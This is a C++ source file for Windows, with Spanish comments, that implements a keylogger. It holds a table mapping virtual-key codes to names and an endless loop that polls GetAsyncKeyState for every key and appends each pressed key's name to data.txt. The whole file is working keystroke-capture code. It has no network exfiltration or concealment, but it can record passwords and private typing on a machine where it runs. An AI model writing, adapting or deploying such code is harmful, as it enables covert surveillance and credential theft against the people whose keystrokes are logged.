#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include <map>


namespace keys{
const std::map<int, std::string> key_codes {
    {8, "vk_BackSpace"},
    {9, "vk_Tab"},
    {13, "vk_Return"},
    {16, "vk_Shift"},
    {17, "vk_Control"},
    {18, "vk_Alt"},
    {19, "vk_Pause"},
    {20, "vk_CapsLock"},
    {27, "vk_Escape"},
    {32, "vk_Space"},
    {33, "vk_PageUp"},
    {34, "vk_PageDown"},
    {35, "vk_End"},
    {36, "vk_Home"},
    {37, "vk_Left"},
    {38, "vk_Up"},
    {39, "vk_Right"},
    {40, "vk_Down"},
    {44, "vk_PrintScreen"},
    {45, "vk_Insert"},
    {46, "vk_Delete"},
    {48, "vk_0"},
    {49, "vk_1"},
    {50, "vk_2"},
    {51, "vk_3"},
    {52, "vk_4"},
    {53, "vk_5"},
    {54, "vk_6"},
    {55, "vk_7"},
    {56, "vk_8"},
    {57, "vk_9"},
    {65, "vk_A"},
    {66, "vk_B"},
    {67, "vk_C"},
    {68, "vk_D"},
    {69, "vk_E"},
    {70, "vk_F"},
    {71, "vk_G"},
    {72, "vk_H"},
    {73, "vk_I"},
    {74, "vk_J"},
    {75, "vk_K"},
    {76, "vk_L"},
    {77, "vk_M"},
    {78, "vk_N"},
    {79, "vk_O"},
    {80, "vk_P"},
    {81, "vk_Q"},
    {82, "vk_R"},
    {83, "vk_S"},
    {84, "vk_T"},
    {85, "vk_U"},
    {86, "vk_V"},
    {87, "vk_W"},
    {88, "vk_X"},
    {89, "vk_Y"},
    {90, "vk_Z"},
    {91, "vk_LWin"},
    {92, "vk_RWin"},
    {93, "vk_Apps"},
    {96, "vk_NumPad0"},
    {97, "vk_NumPad1"},
    {98, "vk_NumPad2"},
    {99, "vk_NumPad3"},
    {100, "vk_NumPad4"},
    {101, "vk_NumPad5"},
    {102, "vk_NumPad6"},
    {103, "vk_NumPad7"},
    {104, "vk_NumPad8"},
    {105, "vk_NumPad9"},
    {106, "vk_Multiply"},
    {107, "vk_Add"},
    {109, "vk_Subtract"},
    {110, "vk_Decimal"},
    {111, "vk_Divide"},
    {112, "vk_F1"},
    {113, "vk_F2"},
    {114, "vk_F3"},
    {115, "vk_F4"},
    {116, "vk_F5"},
    {117, "vk_F6"},
    {118, "vk_F7"},
    {119, "vk_F8"},
    {120, "vk_F9"},
    {121, "vk_F10"},
    {122, "vk_F11"},
    {123, "vk_F12"},
    {124, "vk_F13"},
    {125, "vk_F14"},
    {126, "vk_F15"},
    {127, "vk_F16"},
    {144, "vk_NumLock"},
    {145, "vk_ScrollLock"},
    {160, "vk_LShift"},
    {161, "vk_RShift"},
    {162, "vk_LControl"},
    {163, "vk_RControl"},
    {164, "vk_LAlt"},
    {165, "vk_RAlt"},
    {186, "vk_SemiColon"},
    {187, "vk_Equals"},
    {188, "vk_Comma"},
    {189, "vk_UnderScore"},
    {190, "vk_Period"},
    {191, "vk_Slash"},
    {220, "vk_BackSlash"},
    {221, "vk_RightBrace"},
    {219, "vk_LeftBrace"},
    {222, "vk_Apostrophe"}
};
}



void save_data(std::string data, std::string filePath){
    std::ofstream file(filePath, std::ios::app);

    if(file.is_open()){

        //escribimos los datos en el txt
        file << data << "\n";
        file.close();
    }
}



int main(){
    bool key_pressed = false;

    while(true){ 
        for (int i = 0; i < 256; i++){
            //verificamos si el bit más significativo está a 1 (el valor es negativo)
            //lo que significa que la tecla está presionada
            if(GetAsyncKeyState(i) & 0x8000){
                auto it = keys::key_codes.find(i);

                if(it != keys::key_codes.end() && !key_pressed){
                    save_data(it->second, "data.txt");
                    key_pressed = true;
                }
            }
            
            else{
                key_pressed = false;
            }
        }

    }

    return 0;
}